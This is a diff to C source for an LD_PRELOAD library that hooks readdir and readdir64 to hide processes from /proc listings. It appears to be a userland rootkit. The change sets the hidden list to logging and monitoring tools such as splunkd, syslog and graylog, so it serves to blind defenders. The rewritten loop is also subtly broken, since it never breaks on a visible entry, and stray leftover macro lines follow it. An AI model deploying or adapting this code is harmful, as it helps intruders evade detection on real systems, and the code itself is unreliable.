@@ -12,9 +12,16 @@
  * Add as many as you want, ending with a NULL.
  */
 static const char* processes_to_filter[] = {
-    "evil_script.py",
-    "bad_process",
-    "malware_agent",
+    "splunkd",
+    "splunk",
+    "syslog",
+    "graylog",
+    "log",
+    "notlog",
+    "notlog_tcp",
+    "syslog_tcp",
+    "log_tcp",
+    "splunk_tcp"
     NULL
 };
 
@@ -69,44 +76,50 @@ static int get_process_name(char* pid, char* buf)
     return 1;
 }
 
-#define DECLARE_READDIR(dirent, readdir)                                \
-static struct dirent* (*original_##readdir)(DIR*) = NULL;               \
-                                                                        \
-struct dirent* readdir(DIR *dirp)                                       \
-{                                                                       \
-    if(original_##readdir == NULL) {                                    \
-        original_##readdir = dlsym(RTLD_NEXT, #readdir);               \
-        if(original_##readdir == NULL) {                                \
-            fprintf(stderr, "Error in dlsym: %s\n", dlerror());         \
-        }                                                               \
-    }                                                                   \
-                                                                        \
-    struct dirent* dir;                                                 \
-                                                                        \
-    while(1) {                                                          \
-        dir = original_##readdir(dirp);                                 \
-        if(dir) {                                                       \
-            char dir_name[256];                                         \
-            char process_name[256];                                     \
-            if(get_dir_name(dirp, dir_name, sizeof(dir_name)) &&        \
-               strcmp(dir_name, "/proc") == 0 &&                        \
-               get_process_name(dir->d_name, process_name)) {           \
-                int hide = 0;                                           \
-                for (int i = 0; processes_to_filter[i] != NULL; i++) {  \
-                    if(strcmp(process_name, processes_to_filter[i]) == 0) {\
-                        hide = 1;                                     \
-                        break;                                        \
-                    }                                               \
-                }                                                   \
-                if (hide) {                                         \
-                    continue;                                       \
-                }                                                   \
-            }                                                       \
-        }                                                           \
-        break;                                                      \
-    }                                                                   \
-    return dir;                                                         \
-}                                                                       \
+#define DECLARE_READDIR(dirent_type, readdir_fn, readdir_struct)        \
+static readdir_struct* (*original_##readdir_fn)(DIR*) = NULL;           \
+                                                                         \
+readdir_struct* readdir_fn(DIR *dirp)                                    \
+{                                                                        \
+    if(original_##readdir_fn == NULL) {                                  \
+        original_##readdir_fn = dlsym(RTLD_NEXT, #readdir_fn);          \
+        if(original_##readdir_fn == NULL) {                              \
+            fprintf(stderr, "Error in dlsym: %s\n", dlerror());          \
+        }                                                                \
+    }                                                                    \
+                                                                         \
+    readdir_struct* dir;                                                 \
+                                                                         \
+    while(1) {                                                            \
+        dir = original_##readdir_fn(dirp);                               \
+        if(dir) {                                                         \
+            char dir_name[256];                                           \
+            char process_name[256];                                       \
+            if(get_dir_name(dirp, dir_name, sizeof(dir_name)) &&         \
+               strcmp(dir_name, "/proc") == 0 &&                          \
+               get_process_name(dir->d_name, process_name)) {            \
+                int hide = 0;                                             \
+                for (int i = 0; processes_to_filter[i] != NULL; i++) {   \
+                    if(strcmp(process_name, processes_to_filter[i]) == 0) { \
+                        hide = 1;                                         \
+                        break;                                            \
+                    }                                                    \
+                }                                                        \
+                if (hide) {                                              \
+                    continue;                                            \
+                }                                                        \
+            }                                                            \
+        } else {                                                         \
+            break;                                                       \
+        }                                                                \
+    }                                                                    \
+    return dir;                                                          \
+}
+
+// Declare both wrappers with correct return types
+DECLARE_READDIR(dirent, readdir, struct dirent)
+DECLARE_READDIR(dirent64, readdir64, struct dirent64)
+
                                                                         \
 struct dirent* readdir64(DIR *dirp)                                     \
 {                                                                       \
